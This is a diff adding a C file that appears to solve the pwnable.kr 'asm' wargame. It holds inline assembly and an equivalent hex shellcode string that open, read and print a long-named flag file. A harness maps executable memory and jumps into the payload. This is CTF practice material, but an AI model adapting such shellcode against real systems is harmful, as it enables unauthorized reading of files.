@@ -1,0 +1,111 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <seccomp.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+void func(){
+	__asm__(
+		"movq $0x41414f00, %rbp\n"
+		"push %rbp\n"
+		"movq $0x5f73695f73696874, %rax\n"
+		"movq %rax, (%rbp)\n"
+		"movq $0x2e656c62616e7770, %rax\n"
+		"movq %rax, 8(%rbp)\n"
+		"movq $0x5f67616c665f726b, %rax\n"
+		"movq %rax, 16(%rbp)\n"
+		"movq $0x656c705f656c6966, %rax\n"
+		"movq %rax, 24(%rbp)\n"
+		"movq $0x646165725f657361, %rax\n"
+		"movq %rax, 32(%rbp)\n"
+		"movq $0x69665f736968745f, %rax\n"
+		"movq %rax, 40(%rbp)\n"
+		"movq $0x7972726f732e656c, %rax\n"
+		"movq %rax, 48(%rbp)\n"
+		"movq $0x6c69665f6568745f, %rax\n"
+		"movq %rax, 56(%rbp)\n"
+		"movq $0x695f656d616e5f65, %rax\n"
+		"movq %rax, 64(%rbp)\n"
+		"movq $0x6c5f797265765f73, %rax\n"
+		"movq %rax, 72(%rbp)\n"
+		// 'o' * 4
+		"movq $0x6f6f6f6f6f6f6f6f, %rax\n"
+		"movq %rax, 80(%rbp)\n"
+		"add $84, %rbp\n"
+		// 'o' * 72
+		"xor %rbx, %rbx\n"
+		"start1: cmp $9, %rbx\n"
+		"je offset1\n"
+		"movq %rax, (%rbp)\n"
+		"add $8, %rbp\n"
+		"inc %rbx\n"
+		"jmp start1\n"
+		// '0' * 25 + 'o' * 25
+		"offset1: movq $0x3030303030303030, %rax\n"
+		"xor %rbx, %rbx\n" //flag = 0
+		"jmp offset2\n"
+		"start2: movq $0x6f6f6f6f6f6f6f6f, %rax\n"
+		"inc %rbx\n"
+		"offset2: movq %rax, (%rbp)\n"
+		"add $1, %rbp\n"
+		"movq %rax, (%rbp)\n"
+		"add $8, %rbp\n"
+		"movq %rax, (%rbp)\n"
+		"add $8, %rbp\n"
+		"movq %rax, (%rbp)\n"
+		"add $8, %rbp\n"
+		"cmp $0, %rbx\n"
+		"je start2\n"
+		// delete 'o' * 2
+		"sub $2, %rbp\n"
+		"movq $0x3030303030303030, %rax\n"
+		"movq %rax, (%rbp)\n"
+		"add $3, %rbp\n"
+		"movq %rax, (%rbp)\n"
+		"add $8, %rbp\n"
+		"movq $0x6f306f306f306f30, %rax\n"
+		"movq %rax, (%rbp)\n"
+		"add $8, %rbp\n"
+		"movq $0x676e6f306f306f30, %rax\n"
+		"movq %rax, (%rbp)\n"
+		"add $8, %rbp\n"
+		"xor %rax, %rax\n"
+		"movq %rax, (%rbp)\n"
+		//open
+		"movq $2, %rax\n"
+		"pop %rdi\n"
+		"xor %rsi, %rsi\n"
+		"movq $0x777, %rdx\n"
+		"debug1: syscall\n"
+		"push %rax\n"
+		//buffer
+		"movq $0x41414e00, %rbx\n"
+		//read
+		"xor %rax, %rax\n"
+		"pop %rdi\n"
+		"movq %rbx, %rsi\n"
+		"movq $0x100, %rdx\n"
+		"debug2: syscall\n"
+		//write
+		"mov $1, %rax\n"
+		"mov $1, %rdi\n"
+		"mov %rsi, %rsi\n"
+		"mov $0x100, %rdx\n"
+		"debug3: syscall\n"
+	);
+}
+
+char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff\x48\xC7\xC5\x00\x4F\x41\x41\x55\x48\xB8\x74\x68\x69\x73\x5F\x69\x73\x5F\x48\x89\x45\x00\x48\xB8\x70\x77\x6E\x61\x62\x6C\x65\x2E\x48\x89\x45\x08\x48\xB8\x6B\x72\x5F\x66\x6C\x61\x67\x5F\x48\x89\x45\x10\x48\xB8\x66\x69\x6C\x65\x5F\x70\x6C\x65\x48\x89\x45\x18\x48\xB8\x61\x73\x65\x5F\x72\x65\x61\x64\x48\x89\x45\x20\x48\xB8\x5F\x74\x68\x69\x73\x5F\x66\x69\x48\x89\x45\x28\x48\xB8\x6C\x65\x2E\x73\x6F\x72\x72\x79\x48\x89\x45\x30\x48\xB8\x5F\x74\x68\x65\x5F\x66\x69\x6C\x48\x89\x45\x38\x48\xB8\x65\x5F\x6E\x61\x6D\x65\x5F\x69\x48\x89\x45\x40\x48\xB8\x73\x5F\x76\x65\x72\x79\x5F\x6C\x48\x89\x45\x48\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x48\x89\x45\x50\x48\x83\xC5\x54\x48\x31\xDB\x48\x83\xFB\x09\x74\x0D\x48\x89\x45\x00\x48\x83\xC5\x08\x48\xFF\xC3\xEB\xED\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x48\x31\xDB\xEB\x0D\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x48\xFF\xC3\x48\x89\x45\x00\x48\x83\xC5\x01\x48\x89\x45\x00\x48\x83\xC5\x08\x48\x89\x45\x00\x48\x83\xC5\x08\x48\x89\x45\x00\x48\x83\xC5\x08\x48\x83\xFB\x00\x74\xCD\x48\x83\xED\x02\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x48\x89\x45\x00\x48\x83\xC5\x03\x48\x89\x45\x00\x48\x83\xC5\x08\x48\xB8\x30\x6F\x30\x6F\x30\x6F\x30\x6F\x48\x89\x45\x00\x48\x83\xC5\x08\x48\xB8\x30\x6F\x30\x6F\x30\x6F\x6E\x67\x48\x89\x45\x00\x48\x83\xC5\x08\x48\x31\xC0\x48\x89\x45\x00\x48\xC7\xC0\x02\x00\x00\x00\x5F\x48\x31\xF6\x48\xC7\xC2\x77\x07\x00\x00\x0F\x05\x50\x48\xC7\xC3\x00\x4E\x41\x41\x48\x31\xC0\x5F\x48\x89\xDE\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xF6\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05";
+
+int main(){
+	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+	int size = sizeof(stub);
+	printf("%d\n",size);
+	printf("hello world!\n");
+	memcpy(sh, stub, size);
+	((void (*)(void))sh)();
+	// func();
+	return 0;
+}
